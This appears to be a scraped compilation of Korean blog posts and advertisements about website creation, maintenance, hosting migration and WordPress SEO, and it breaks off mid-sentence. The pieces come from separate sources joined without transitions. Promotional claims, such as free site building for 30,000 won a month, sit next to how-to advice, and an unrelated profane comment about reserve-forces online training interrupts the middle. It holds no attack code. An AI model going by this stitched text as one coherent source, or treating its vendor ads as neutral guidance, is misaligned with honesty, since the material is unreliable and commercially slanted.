마케팅 수단과는 달리 시간과 장소 제약없이실시간으로정보 전달이 가능합니다!    홈페이지관리 - 10억홈피  WCMS WCMS의 가장 큰 장점 중 하나는바로 콘텐츠를 직접 관리할 수 있다는 점인데요!TEXT 타입의 콘텐츠의 경우 관리자가 쉽게수정,추가,삭제 할 수 있습니다!포털사이트에 웹문서로 노출이 가능하게 되죠​그외 다중사이트를 구축할 때(EX 다국어 사이트)통합으로 운영할 수 있으며 다양한 Open API를 지원하고 있습니다!여러 스마트 기기에서도 동일한 UI가 표현되는크로스 브라우징, 멀티플랫폼 기능까지 제공된답니다!   홈페이지관리 - 10억홈피  WCMS WCMS는 광주 최초 KTL의 GS 인증까지 획득한 10억홈피의 자체개발솔루션이랍니다!홈페이지관리 프로그램,단순히 관리하는 도구가 아닌 마케팅 도구로써의 활용까지 꼼꼼히 따져보세요!​▼홈페이지제작 바로가기▼   ​ 홈페이지제작을 하다보면 공지사항,뉴스란을 꼭 만들게 됩니다.​그런데, 운영하는 홈페이지의 공지사항,뉴스란은 항상 저희가 초기 제작한 상태 그대로인 경우가 다반사입니다.​공지사항 예) 제목 : ○○○○ 홈페이지에 오신 여러분 환영합니다.○○○○ 홈페이지 에 오신 것을 환영합니다. 저희는 ○○○○ 상품을 준비하고 고객여러분께 더 나은 모습으로 찾아뵙겠습니다. 끊임없는 기술개발과 연구를 통해 업계를 선도하는 ○○○○ 으로 자리매김할 수 있도록 최선의 노력을 다하겠습니다. ○○○○ 임직원일동​그리고, 1년 2년...​  ​​공지사항 또는 게시판 글쓰기가 어려우실 경우,FAQ (자주묻는 질문) 등만 남겨 놓으시고, 나머지 게시판은 가리는 것이 낫습니다.​예)- 견적문의방법 ▼(오픈)견적문의메뉴를 선택하신 후 1)마음에 드시는 참고하실 홈페이지를 1,2개정도 찾으셔서 홈페이지 주소를 적어 주시고, 2)업종과 3)홈페이지에 담겨야할 꼭 필요한 내용을 간략히 적어서 4)상호와 연락처,이메일 주소를 기재하시고, 5)오픈희망일까지 남겨서 보내주시면, 담당자가 확인 후 빠른 회신드립니다.견적에 필요한 추가사항이 있을 경우 기재해주신 연락처로 견적 담당자가 전화드릴 수 있으니, 가급적 의뢰 내용을 잘 아시는 담당자 연락처를 기재해 주시면 감사하겠습니다. ​​​그렇다고 공지사항이 쓸모가 없는 것은 아닙니다. 공지사항만 잘 관리해도 문의가 많아지는 것을 경험하실 수 있습니다. 일반적으로 공지사항에 적을 만한 것이 없다고 하시는데요...​공지사항에는 이런 것들을 적으시면 됩니다.​1) 이번 주 생산(제품) 수급현황 또는 오픈일정2) 이번 주 업무, 또는 휴무일정3) 이번 주 담당자 출장 또는 외근일정4) 이번 달 고객사 특전5) 가격변동6) 신규 출점(점포확장 등)7) 인사이동8) 새해 인사,계절인사9) 기타 고객이 알면 도움 되는 일들...​공지사항의 힘결코 수백만원 광고비보다 효과가 없다고 할 수 없답니다. ​공지사항 잘 관리하시고모두 부자 되세요~^^​  팁) 빠른홈페이지제작관리센터를 이용하셔도 꾸준한 공지사항 등록관리 해드리니 많은 이용 바랍니다. ​​​​  그로우 툰 아카데미에서 디자인, SNS, 홈페이지 관리해주실 분을 찾습니다. 온라인으로 만화/ 웹툰 제작 강좌를 판매하는 홈페이지 입니다.근무형태는 재택근무로 진행됩니다.  온라인 웹툰교육의 첫 주자인 GTA와 함께 일해주실 센스만점의 인재를 기다리고 있습니다^^준비되신 분들은 지금 바로 지원해주세요!▽지원하기▽그로우툰아카데미 - (재택근무) 디자인, SNS, 홈페이지 관리자 모집 - 방문자수 1위 ...www.saramin.co.kr기업형홈페이지,반응형홈페이지, 쇼핑몰홈페이지, 제작에서 유지관리 한번에  퀼리티 / 가성비  까지 바른웹웹사이트 주소,  홈페이지주소, 도메인,  의미하지요,  상업적인 가치를 가지고 있기 때문에  쉬운 도메인 선점하기 위해치열하게 소유권으로 운영하시는 기업들이 많이 있었습니다.한글도메인의 경우  한글사랑으로 많이 사용하시고 있습니다.​ 홈페이지 비용절감의 기회가 있는  전문 디자이너들이 직접 디자인하는 기업형홈페이지 제작 홈페이지관리까지 기회를 놓치지 마시고  상담 받아보세요#홈페이지제작 #기업형홈페이지 #반응형홈페이지 #쇼핑몰홈페이지 #독립형홈페이지​ 홈페이지 관리를 오래한 노하우와  대표님들의 마케팅컨설팅으로 인정받고 있어많은 정보를 공유하고 있는 마케팅 담당자로  공식홈페이지  기업형홈페이지로 관리에 대한 모든것을컨설팅하고 있는 담당 입니다.​https://0260064783.modoo.at/ [홈페이지제작 관리 - 홈] 포털사이트홈페이지 관리홈페이지제작, 독립형홈페이지, 통합컨설팅유지관리0260064783.modoo.at ​ 홈페이지 종류도 많고 제작사도 많이 있어 홈페이지에 대한 사용이나  방식을 제대로 알고기업형홈페이지를 운영하신다면 지금보다 사업을 하시는 동안  회사이미지 구축하실수 있는기회이기도 합니다.  임대형홈페이지, 템블릿홈페이지, 도메인주소없이 사용하는 홈페이지  내 기업의 회사을 대표하는 홈페이지는 정확하고 확실한 홈페이지로  제작 받아보세요 ​​ ​ ​무슨 온라인 수강에 요일별이야홈페이지 관리능력 안된다고 광고 대놓고하는건가예비군 원격교육을 하씹 ㅋㅋ그많은 예산 어디다가 써먹냐 새끼들아.. 오프라인보다는 온라인에서 정보를 얻는 시대!사람은 누구나 '손해 보는 것'을 싫어합니다. 그렇기에 우리는 무언가 제품이든 서비스든 구매하기 이전에 충분한 사전 정보를 얻고 이를 토대로 선택에 반영하게 됩니다. 상품평을 보는 것 또한 이와 같은 맥락이죠. 예전에는 이 과정이 이루어지기 위해 흔히들 '발품판다'고 표현하듯 직접 발로 뛰며 비교 분석하여 정보를 얻었습니다. 하지만 이제는 대부분 온라인시장으로 전환하면서 새로운 것이 나오면 후기가 줄줄이 올라오게 되고 이를 토대로 정보를 얻게 되었습니다. 홈페이지 왜 필요해요?그렇다면 이렇게 정보만 얻으면 되지 왜 구태여 홈페이지와 도메인이 필요하다고 하는 것일까요? 물론 들 수 있는 이유는 많습니다. 아무래도 제대로 된 홈페이지제작이 이루어져야 소비자들에게 신뢰도를 줄 수 있기도 하며, 대부분 블로그나 기타 마케팅은 사용 후 후기성으로 들어가는 경우가 많아 정보를 전달할 수 있는 공간이 구축되어야 한다는 것도 들 수 있습니다. 하지만, 가장 큰 이유는 아무래도 '남들 다 하니까'가 맞다고 할 수도 있을 것 같습니다. 대부분이 인터넷상에서 이루어지는 요즘, 누구나 다 가진 홈페이지 나만 없는 것도...  유지보수계약 무조건 해야 한다던데?저희가 항상 안타깝다고 생각하는 부분은 '제대로 된 정보를 아무도 알려주지 않는다'는 것입니다. 정말 수많은 광고회사와 웹에이전시가 생겼습니다. 그만큼 누구나 다 본인의 회사가 최고이고, 제일 홈페이지를 잘 만든다고만 말합니다. 그래서 어딜 어떻게 잘해서 왜 그곳에서 해야 하고 소비자의 선택에 도움이 되는 설명은 간과한 채 말이죠. 그렇게 감언이설로 꼬드긴 다음 가격이나 서비스에 대한 부분만 이야기하고 제작과 관련된 이야기만 합니다. 하지만 홈페이지에서 더욱 중요한 것은 물론 잘 만들어지는 것도 있지만, 유지보수라고 말씀드리고 싶습니다. 많은 업체와 상담해보시거나 직접 해보신 분이라면 더욱 잘 알고 있으시겠지만, 대부분은 '유지보수'에 대한 설명이 제대로 되어있지 않습니다. 오히려 계약서를 들이밀며 우리가 제작하였으니 유지보수도 우리 쪽에서만 하셔야 한다. 그리고 보수를 위해서는 추가로 돈을 내며 필수적으로 계약을 해야 한다고 말하기도 합니다.​물론 모든 기업이 그렇다는 식의 섣부른 일반화는 옳지 않습니다. 하지만 이처럼 관리가 부진하거나, 혹은 제작사의 금전적인 횡포, 그리고 내 서버를 내 마음대로 할 수 없는 불편함 등의 사유 때문에 사이트를 만들어두고 서버이전을 알아보거나 호스팅이전을 알아보게 되는 경우가 발생합니다. 사실, 잘 만든 서버는 딱히 유지보수가 필요 없기도 합니다.  홈페이지이전 많이 어려울까요?물론 홈페이지를 이전하는 과정이 쉽다고는 말씀드리기 어렵습니다. 회사마다 지향하는 언어도 다르고, 개발자나 퍼블리셔에 따라 또 소스 코딩 스타일이 다른 경우도 많으며, 절대코딩 등의 정말 말도 안 되지만 클라이언트가 전문가가 아니라서 잘 모른다는 이유만으로 정말 구동만 되게끔 엉망으로 소스를 꼬아놓는 경우도 없는 편은 아닙니다. 또 호스팅 서버 PHP 버전이 다른 경우 충돌을 일으키기도 하고.. 코딩이라는 것이 정말 점 하나, 띄어쓰기 하나만 잘못되어도 제대로 돌아가지 않는 경우가 많은 까다로운 작업이기도 합니다.​그렇기에 호스팅관리와 같은 부분은 일반인 분들은 대부분 하지 못하는 전문적인 영역이기도 하고, 그렇기에 덤터기를 씌우는 경우도 허다하기도 하여 더욱 주의를 기울여 잘 알아보시고 업체를 선정할 수 있어야 합니다.  백 번 말 하는 것보다 직접 상담해 보세요!결국 다른 의미의 발품을 팔아야 하는 것은 맞습니다. 직접 발로 안 뛸 뿐이지 온라인상의 수많은 업체를 비교하여야 하는 것은 변함없습니다. 그런 의미에서 지금 이 글을 보고 있으신 여러분들에게는 오히려 좋은 기회라고도 말씀드릴 수 있습니다. HL-STORY에서는 홈페이지제작으로 끝이 아니라 서버이전, 호스팅이전, 홈페이지이전, 서버관리, 호스팅관리 등 관련 고충을 가지고 있으신 분들에게 도와드릴 수 있기 때문입니다. 특히 서버를 제작하고 유지보수와 이전을 진행하다 보면 정말 담당자와 연락이 두절되어 원활하게 요청사항을 피드백되지 않는 경우가 많습니다. 이는 한 담당자가 여러 업체를 동시에 맡거나, 혹은 외주 등으로 인해  실행사와 대행사가 다른 등 수많은 이유가 있을 수 있습니다. 하지만 이는 결국 업체의 사정일 뿐 고객이 신경 써야 하는 부분은 아니지만 아이러니하게도 그 모든 부담은 고객인 클라이언트가 받고 있기도 합니다. 에이치엘스토리에서는 회사 카카오톡, 이메일, 전화 등으로 수정 요청 시 즉시 답변드리고 있으며, 홈페이지 유지보수 담당자를 1:1로 전담 배치하여 원활한 커뮤니케이션과 피드백이 이루어질 수 있도록 하고 있으며, 더 나은 편의와 완성도를 위해 언제나 최선을 다하고 있습니다. 에이치엘스토리부산광역시 남구 전포대로 133 또한, 다양한 업종을 담당하면서 업종별로 원하는 사항에 대해 파악하여 만족스러운 결과를 만나보실 수 있도록 하고 있으며, 비용을 비롯하여 각종 궁금한 사항이 있으시다면 하단 링크나 상담을 통해 문의해 주시면 친절하고 빠르게 도와드리겠습니다. 단순히 고객과 업체라기보다는 함께 성장해나가는 동반자라고 생각하며 언제나 여러분의 성공을 기원하고 있습니다.  ​ 안녕하세요. 홈페이지 제작 소개 ING입니다.  회사를 소개하기 위해 홈페이지를 만들어보았지만원하는 대로 만들어지지 않아서 고민하시는 분들께추천드리는 홈페이지 제작 잘하는 곳!​퀄리티 좋은 홈페이지 제작부터 관리까지 가능한바른웹을 합리적인 가격으로 만나보시길 바라요.​[바른웹 자세히 보기]​ 홈페이지 제작​혼자서 만들기가 어렵다면 전문 업체의 도움을받아서 완벽하게 제작하는 것이 당연 좋겠죠?​하지만 전문 업체들의 경우 비용이 너무 비싸서내가 원하고 있는 홈페이지가 저렴한 비용으로만들어질 수 있을지 고민을 하고 계실 텐데요.​오늘 소개해드리는 바른웹에서는 저렴한 비용& 고퀄리티 홈페이지 제작 및 관리가 가능해서만족감이 들 수밖에 없다고 소문이 나 있어요 : ) 비용 부담없는 바른웹​회사를 소개하기 위해서라면 관리가 필요한데업체를 통해 제작부터 관리까지 진행을 한다면비용적으로 큰 부담이 느껴지는 것은 당연해요.​하지만 바른웹에서는 비용 부담이 없다는 사실!​7년간 10,000여 개 이상의 홈페이지를 제작해온전문 업체로 양한 제작 프로그램이 개발되어 있어제작비용을 무료로 제공해드린다고 해요.​거기다가 월 3만 원으로 홈페이지 관리가 가능해나만의 멋진 홈페이지를 유지할 수 있답니다 : )* PC 홈페이지 제작비용 무료?!모바일 홈페이지 제작비용 무료?!반응형 홈페이지 제작비용 무료?!​무료로 진행되는 홈페이지 제작이라서디자인이 대충 만들어지면 어떡하지-?​탬플릿 형태가 아닌 전문 디자이너들이직접 디자인해드리는 홈페이지 제작이며바른웹 제작 독립형 홈페이지는 5년 이후비용 발생 NO, 홈페이지 본인 소유 OK !​홈페이지 임의 수정도 가능해 오랜 사업을하시는 분들께서는 비용 절감이 가능한기회를 잡아보실 수 있는 바른웹이에요. 표준형 홈페이지 무료제작 서비스​최대 32페이지 홈페이지 무료 제작모바일 홈페이지 무료 제작원하는 도메인 무료 등록2차 백업 서비스 무료 제공방화벽 무료 세팅​홈페이지 제작을 위해 초기에 비용을 지불했지만추가적 비용이 계속 들어간다면 그것도 스트레스!​바른웹에서는 비용 스트레스가 없기 때문에만족하실 수 있는 홈페이지 제작이 가능해요 : )* 홈페이지 제작 & 관리 업체​업체를 알아보실 때는 안정적이면서도 효과적인운영을 해 주는 전문 업체를 찾아보셔야 합니다.​전문 디자인이 원하는 디자인으로 제작을 해주기때문에 나만의 멋진 홈페이지 제작이 가능해요.​개인, 회사 홈페이지 제작 및 관리!고민하지 마시고 저렴한 비용으로 진행해 주는바른웹을 만나보시길 바랍니다 ~ *​[ 제작 문의하러 가기 ]​ ​ 홈페이지 제작을 준비하고 계신 분들은 참고해 주시기 바랍니다.​큰 대기업 같은 경우에는 홈페이지를 관리하는 부서가 있겠지만그렇지 않은 경우에는 전문업체에 의뢰하거나 직접 제작해야 하겠죠​요즘은 홈페이지를 개인이 직접 제작할 수 있도록 도와주는 플랫폼도 많아서 쉽게 만들 수 있습니다.​하지만 제작되어 있는 정형화된 폼을 사용하는 방법이 대부분이기 때문에마치 블로그를 사용하는 수준이라고 생각될 수 있습니다.​그래서 홈페이지제작 전문가가 아니라면 홈페이지제작업체를 통해서만드시는 것을 추천드리는데요​수많은 업체 중에서 어떻게 선정해야 좋을지 체크 포인트 몇가지를 알려드리겠습니다.​​​​ © 200degrees, 출처 Pixabay​​첫번째는 제작해주는 업체가 제작만 해주는지 아니면 제작 후 관리까지 해주는 곳인지 확인하셔야 합니다.​제작만 하면 되는거 아닌가? 하시겠지만, 홈페이지는 제작만큼이나 관리가 중요합니다. 예를 들어 원인모를 이유로 갑자기 접속이 않된다면 해결하실 수 있을까요?​또 수정할 내용이나 업데이트 할 내용이 생긴다면 또 업체를 알아보고 비용을 지불해야 하겠죠​그래서 제작 후에 관리까지 해주는 홈페이지제작업체를 찾는게 중요합니다.​​​ © kreatikar, 출처 Pixabay4​​두번째로 체크해야 하는 내용은 임대형인지 소유형인지 알아보셔야 합니다.​홈페이제작업체 중에서는 저렴한 비용으로 제작해 준다고 광고를 하지만사실상 임대해주는 곳들이 종종 있습니다.​​임대형 홈페이지의 경우 실제 사용할때는 큰 차이가 없지만 일정기간이 지나고계약기간이 종료된다면 홈페이지 소유권이 나에게 오는 것이 아니라 업체로 가게 됩니다.​아니면 다시 계약금을 내면서 재계약을 해야 하죠​그래서 임대형인지 소유형인지 확실하게 체크해 보셔야 합니다.​​ © 200degrees, 출처 Pixabay​​​세번째는 비상시에 바로바로 해결해 줄 수 있는 곳인지 확인해야 합니다.​사후관리와 내용이 겹칠 수 있는데요 홈페이지를 제작하고 운영하다보면여러가지 크고 작은 오류가 발생하는 경우가 많습니다.​예를 들어 서버가 다운되거나 바이러스 감염, 외부의 악성코드 등 다양한 문제가 발생할 수 있죠​홈페이지제작업체를 알아보실때는 이러한 내용까지 관리해 주는 곳인지체크해보는게 중요합니다.​​​ © thenewmalcolm, 출처 Unsplash​​네번째는 모바일용 홈페이지까지 제작해주는 곳인지 보세요​너무나 당연히 모바일 홈페이지 제작은 필수입니다.모바일 접속환경에 맞도록 홈페이지를 제작해주는 곳인지 체크해 보시기 바랍니다.​​​​​ © christianw, 출처 Unsplash​이렇게 홈페이지제작업체 선정시 체크포인트 몇가지를 알려드렸는데요​이런 여러가지 내용에 부합하면서 평이 좋은 곳 한 업체를 알려드릴게요​ © coffeebeanworks, 출처 Pixabay​​가장 중요한 요소 중 하나가 비용이겠죠 퀄리티는 좋으면서 비용이 저렴해야 하겠죠업체를 알아보신 분들은 아시겠지만 제대로 된 홈페이지를 제작하기 위해서는 300~500만원 정도 견적이 나오는데요​​​ ​​이곳은 제작비용이 들어가지 않고 월 3만원의 관리비만 들어가게 됩니다.계약기간이 끝나고 나면 더 이상의 비용없이 소유권이 나에게 넘어오기 때문에일반적인 제작만 해주는 업체들보다 훨씬 저렴하게 관리까지 받을 수 있는 곳입니다.​​ ​​또 위 내용과 같이 홈페이지 제작,모바일 홈페이지제작은 물론이고원하는 도메인 등록, 혹시 모를 사태를대비해서 2차 백업까지서비스 해주는 곳입니다.​월 3만원에 위 내용의 혜택을제공해 주는 곳입니다.​​ ​​자세한 내용을 위 사이트에서 알아보시면큰 도움 되시리라 생각됩니다.​​ ​​신규 업체가 아닌 7년동안 홈페이지를제작해 온 업체이기 때문에 만족도도 높으실거에요​​​ © DavidZydd, 출처 Pixabay​ ​ 검색엔진 마케팅에 필요한 홈페이지 제작은 워드프레스 기반으로 준비하는 것이 좋습니다. 그 이유에 관해 오늘 포스팅에서 상세하게 전달할 예정이며 홈페이지의 검색엔진 최적화 기능이란 무엇이고 어떤 방식으로 구성하고 어떻게 관리되야 하는지 필자만의 고유한 워드프레스 웹사이트 제작 관리 노하우를 전달합니다.​기본적으로 해당 글을 이해하기 위해서는 워드프레스에 대한 이해와 검색엔진 최적화 방법에 관해 전달해야 하기 때문에 포스팅이 조금 길어질 수 있지만 하나의 글로 마케팅에 최적화된 워드프레스 홈페이지 제작 관리 방법을 이해하기 위해서는 소개된 글을 끝까지 읽어 주시기 바랍니다. ​ 검색엔진 최적화 홈페이지 워드프레스 제작과 관리 과정 ​이제 검색엔진 최적화의 계념을 이해했다면 검색엔진이 좋아할만한 홈페이지를 제작하고 관리해야 합니다. 그러기 위해서 우리는 워드프레스 웹사이트를 이용하는 것이 유리하다는 것을 알고 있습니다. 그 이유는 꾸준하게 컨텐츠를 발행하고 가치 있는 정보를 제공해야 검색엔진 최적화에 도움이 된다는 사실을 알기 때문미며 꾸준하게 발행되고 가치 있는 정보를 담기 위해서 중요한 것은 스스로 관리할 수 있어야 한다는 점입니다. 홈페이지 관리를 스스로 할 수 없는데 이용자가 원하는 정보를 꾸준하게 발행할 수 있는 방법은 없습니다. 워드프레스 홈페이지는 누구나 제작 관리가 가능한 프로그램입니다. 기본적인 사용법을 숙지하고 꾸준하게 운영하면서 그 스킬을 향상 시킬 수 있는 CMS라는 점에서 검색엔진 최적화 홈페이지로 추천하고 있습니다. 워드프레스 홈페이지 제작워드프레스 홈페이지 제작을 위해서는 먼저 호스팅이 필요합니다. 도메인을 생성하고 서버에 워드프레스를 등록하는 과정이 바로 호스팅입니다. 호스팅이 완료되면 워드프레스를 운영하기 위해서 기본적인 설정 후 페이지를 생성하고 홈페이지를 지정하게 되는데요 만약 이런 부분들이 어렵다고 생각하면 여기까지는 대행을 맡길 수 있지만 홈페이지 제작 과정을 알고 있는 사람과 반대의 경우 워드프레스 홈페이지 관리에서 많은 차이를 만들기 때문에 퀄리티가 크게 문제되지 않는다면 스스로 홈페이지를 만들 수 있어야 합니다.​초보자를 위한 워드프레스 홈페이지 제작에 도움을 드릴 수 있는 웹사이트를 운영하고 있으니 스스로 도전하기를 희망하는 분들은 참조해 보시면 도움이 될 것입니다.​ 워드프레스 홈페이지 제작 / 블로그 관리 / 검색엔진 최적화 마케팅 - myweb워드프레스 홈페이지 워드프레스 홈페이지 제작 광고를 위한 검색엔진 최적화 마케팅 정보 워드프레스 홈페이지 제작 관리 myweb 워드프레스 홈페이지 제작 관리개인이나 기업 홈페이지 제작은 물론 마케팅을 위한 검색엔진 최적화 관리 워드프레스…myweb-wp.com 해당 웹사이트는 워드프레스 홈페이지 제작과 관리를 오직 테마와 플러그인을 이용해서 누구나 쉽게 사용할 수 있는 방법을 소개하고 있으며 워드프레스 홈페이지 제작과 관리를 위해 호스팅 코딩 SEO 관리 등 꼭 필요한 정보를 제공합니다. 워드프레스 홈페이지 관리이번 포스팅의 핵심은 검색엔진 최적화 홈페이지 관리입니다. 그런 점에서 워드프레스 홈페이지가 유리함을 전달하기 위한 목적으로 출발했고 그러기 위해서는 검색엔진 최적화에 관해 기본적인 이해가 필요합니다. 검색엔진 최적화 관리는 워드프레스 홈페이지 운영에서도 가장 중요한 핵심이기 때문에 다음 쳅터에서 검색엔진 마케팅을 위한 최적화 웹사이트 구축에 관해 소개해 드리겠습니다.​우선 워드프레스 홈페이지 관리의 핵심은 알고 넘어가도록 하겠습니다. ​필자가 워드프레스를 홈페이지를 직접 운영하고 추천하는 가장 큰 이유는 검색엔진 마케팅에 가장 유리한 프로그램이라는 점입니다. 소비자가 원하는 정보를 검색엔진을 통해 꾸준하게 제공할 수 있으며 다양한 방식을 이용해서 웹사이트 랭크 향상이 전문가가 아니라도 가능하기 때문입니다.​워드프레스 홈페이지 관리 핵심은 컨텐츠 발행입니다. 또한 발행되는 컨텐츠는 꾸준함을 유지하고 검색엔진과 이용자가 원하는 가치 있는 정보가 되야 합니다. 정보의 질은 여러분이 결정하며 그 노력 여하에 따라 검색엔진 최적화 성공 여부가 최종적으로 결정됩니다.​워드프레스 홈페이지 관리는 쉽고 빠르게 배울 수 있는 장점을 가지고 있어 여러분 스스로 원하고 도전한다면 누구나 가능합니다.​ 검색엔진 최적화의 이해와 검색엔진 마케팅의 뜻 검색엔진 최적화란 무엇인가부터 확인해 보자. 포털을 통해 검색엔진 최적화에 관해 검색을 해 본 경험이 있는 분들이라면 비슷 비슷한 내용들을 텍스트만 다르게 표현하고 있다는 사실을 안다. 그렇다고 그 정보들이 틀린것은 아니며 100% 정확한 것도 아니다. 지금부터 필자가 소개하는 검색엔진 최적화의 이야기도 100% 정확하다고 볼 수 없다.​검색엔진 최적화에 대한 정답을 아는 이가 있다면 아마 전 세계에서 가장 부자가 될 수도 있지 않을까? 우리는 여러가지 경험과 각 포털에서 발표하는 SEO 시책을 종합해서 검색엔진이 가장 좋아할만한 컨텐츠를 발행하는 방법을 검색엔진 최적화 방법이라 부른다.​필자가 생각하는 검색엔진 최적화 핵심 키워드는 크롤링(Crawling), 인덱싱(Indexing), 랭킹(Ranking) 그리고 사용자의 리즈를 반영한 양질의 컨텐츠 제작이다.​중요도는 양질의 컨텐츠가 최 우선이다. 또한 크롤링, 인덱싱, 랭킹의 경우 검색엔진의 영역이지만 컨텐츠 제작은 여러분이 관리할 수 있는 분야이기 때문이다. 검색엔진 최적화를 이야기하면 어김없이 등장하는 크롤링 인덱싱 랭킹을 이해하면 검색엔진 최적화를 위한 기본 지식을 가질 수 있다. 크롤링은 검색엔진이 웹의 정보 수집을 위해 크롤러라는 로봇을 이용해서 컨텐츠를 수집하는 과정을 말하는데 새롭게 웹사이트를 제작한 후 크롤링에 도움을 주기 위해서는 검색 주기를 빠르게 하는 작업이 필요하기 때문에 구글 네이버 웹마스터 도구에 웹을 등록하고 크롤링을 기다리는 것입니다.​크롤링되지 않은 웹 컨텐츠는 검색에 반영되지 않는다는 점에서 검색엔진 최적화의 기본이라 할 수 있습니다.​인덱싱 과정을 유리하게 하기 위해서는 웹사이트 정보가 꾸준하게 생성되고 이해하기 쉽게 만들어지는 것이 좋습니다. 여기에서도 검색엔진은 최고의 고객이지만 실제 이용자의 리즈가 반드시 반영되야 합니다. 저장된 정보들은 이곳에서 부터 검색 순위를 결정하기 때문에 중복된 컨텐츠나 사용자가 원하지 않는 컨텐츠의 경우에는 랭킹에서 밀리게 됩니다.​랭킹의 결정하는 요소는 사실 누구도 알수 없는 포털의 알고니즘입니다. 다만 새로운 컨텐츠보다 꾸준하게 운영되는 웹의 정보들이 검색 순위 상위를 차지하는 것을 미루어보아 인덱싱 과정에서 데이터가 많은 것이 더 유리하다는 점은 확실합니다.​웹사이트 운영 초반에는 아무리 좋은 컨텐츠라도 구글의 경우 검색 자체가 되지 않거나 검색 순위가 떨어지는 것을 볼 때 사이트 랭크를 결정하는 중요한 요소 중 하나는 꾸준한 정보 발행이라는 것이 필자의 오랜 경험에서 온 확신입니다.​여기까지가 검색엔진 최적화(SEO)와 관련한 기초적인 지식이라고 볼 수 있고 검색엔진 마케팅(SEM)과의 차이점을 단순하게 생각하자면 디테일을 차이라고 볼 수 있습니다. 검색엔진 최적화가 웹 노출을 위한 전체적인 관리라면 검색엔진 마케팅은 트래픽을 위한 다양한 방식을 적용하는 것입니다.​워드프레스 홈페이지를 예를들면 사이트 구성하고 레이아웃을 결정하며 각각의 페이지를 생성하고 컨텐츠를 발행하는 과정이 검색엔진 최적화를 위한 과정이라면 해당 홈페이지를 외부 배너를 통해 링크한다던지 SNS를 통한 홍보, 자체 포스팅을 꾸준하게 발행하는 등의 활동은 검색엔진 마케팅을 위한 작업입니다.​여러분이 네이버 블로그를 통해 검색 섹션에 노출시키기 위한 노력도 검색엔진 마케팅이라 볼 수 있습니다. 네이버 블로그는 맞지만, 확인불가홈페이지 유지보수 신속한 대응이 중요하시나요?아니면 비용이 중요하세요?​여러분은 어디에 중점을 두고 선택하시나요.​별거 아니지만 다소 어려울 수도 있어 그간 경험에 기반하여 작은 고민이나마 줄일 수 있도록 알고 있는 정보와 가이드를 드릴까 합니다.​ ​안녕하세요, IT도움으로 시간과 비용을 절약해 주고 있는 트러블슈팅입니다.​앞서 홈페이지 운영서버 HW 시스템 관리, 유지보수에 대해 알아보았었는데요.​ 중소기업 서버 관리, 시스템 유지보수 필요할까?대기업이나 정보시스템을 다수 보유하고 있는 기업이 아닌 경우 서버 관리, 시스템 유지보수를 위해 외주를...blog.naver.com ​​오늘은 홈페이지 유지보수 관리에 대해서 알아보겠습니다.​​아직까지도 많은 개인, 중소기업에서는아주 오래전에 개발된 홈페이지를 운영하고 있는 것을 볼 수 있는데요.​이런 홈페이지들은 당시 유행했던 플래시와 기술을 사용하여 좀 더 다이내믹하게 만들어졌습니다.​그렇다 보니 최신 크롬이나 엣지, 사파리 등 웹브라우저 개발 업체의 보안성 강화로 인해 여러 가지 오류가 나타나고 있답니다.​홈페이지 화면이 깨지는가 하면 각종 기능들이 제대로 작동하지 않기도 하고 심지어 쇼핑몰 같은 경우에는 결제 기능에 불특정한 오류가 발생하기도 하죠.​이렇게 되면 나도 모르는 사이 기업 이미지에 좋지 않은 영향을 끼칠 수도 있게 됩니다.​또한, 쇼핑몰이나 결제 기능이 탑재된 홈페이지를 운영하는 분이라면 알 수 없는 오류로 인해 고객 이탈이 발생하여 비용 손실을 가져올 수도 있어요.​오류가 발생하였을 때, 고객이 문의하여 알려준다면 참 좋겠지만 그냥 가버릴 확률이 휠씬 많아요.​ ​홈페이지를 이용하는 모든 사용자에게 발생하는 오류가 아니라면 운영자는 잘 알 수가 없어 계속 방치하는 경우가 많으니 특별히 관리에 신경을 써줘야 한답니다.​​안드로이드 스마트폰 사용자냐 아니면 아이폰 사용자이냐에 따라서도 오류 발생 유무에 차이가 있으니 알아 두셔야 합니다.​​특히 홈페이지를 통해서 비즈니스를 하시는 분들은 웹브라우저의 보안정책에 대한 관련 뉴스 기사가 나온다면 - 나와 직접적인 관련이 없더라도 - 한 번쯤은 관심을 가지고 보시기 바랍니다.​그리고, 홈페이지 유지보수 업체가 있다 하더라도 이런 것까지 챙겨주는 업체는 그리 많지 않으니 관리업체에 영향은 없는지 반드시 확인해보셔야 해요.​​만약, 임대형 쇼핑몰이나 빌더형 홈페이지 서비스를 이용하는 경우라면 그나마 다수의 개발자들이 항상 관리와 대응을 하고 있어 이러한 리스크에서는 좀 자유로울 수 있습니다.​​​그럼 자체적으로 운영하고 있는 홈페이지나 쇼핑몰 유지보수는 어떻게 하면 좋을까요?​ ​돈을 주고 유지보수를 하자니 특별히 관리할 것도 없는 것 같은데 비용이 아깝고, 그렇다고 그냥 두자니 오류가 하나 둘 발생하지만 지금 당장은 큰 문제가 없어 방치하게 되는데요.​이러다 시간이 지나 더 큰 문제가 닥치게 되면 그때서야 여기저기 유지보수 업체를 알아보는 것이 일반적인 경우라고 할 수 있어요.​우리의 마음이 다 그렇지 않나 하는 생각이 듭니다.​​​인터넷으로 검색을 통해 유지보수 업체와 비용을 알아보면 웹에이전시와 같은 홈페이지 제작업체의 경우, 가격이 대부분 비슷한 데다 막상 선택하려면 결정하기 쉽지 않아요.​​홈페이지 관리와오류/장애 해결 등의 작업을 하다 보면 홈페이지 유지보수 업체들의 다양한 문제들을 보고 듣게 되는데요.​오늘은 중소기업 홈페이지 관리 유지보수에 대해서 좀 자세히 알아보도록 할게요.​ ​​가끔 홈페이지 유지보수 문제로 다양한 분과 상담을 하다 보면 기존 유지보수 업체가 잘 대응이 안된다는 것과 오류 장애에 대한 문제 해결에 대한 불만이 가장 많아요.​​그 이유를 분석해보면 다음 3가지 경우가 가장 많으니 참고하시기 바랍니다.​01 유지보수 비용 대비 고객의 빈번한 요청​이것은 홈페이지 유지관리 범위와 횟수를 명확하게 하지 않았을 때 종종 발생하는 것인데요.​홈페이지 관리업체가 문제있어서 그런 경우도 있지만, 의뢰자분의 지나친(?) 요구에 의해서도 생기는 문제입니다.​업체의 입장에서는 유지보수를 지속해야 하니 딱 잘라 말하기도 어렵고 그렇다고 비용을 더 달라고 하기도 어려울 수 있어요.​다음 예를 생각해 보시면 조금은 이해가 될거라 생각해요.​우리나라 최저 시급이 올해 기준으로 아무리 단순한 일을 하더라도 1시간에 8,720원인데요. 단순 심부름을 하던 경비를 하던 편의점 알바를 해도 그 돈 이상을 줘야 하고 받아야 하죠.​전문가라고 할 수 있는 개발자나 디자이너가 어떤 요청을 받아 일을 처리하려면 단순 텍스트 수정이나 이미지 교체가 아니라면 1시간은 쉽게 소요될 수 있는데요.​한 달에 단순 작업 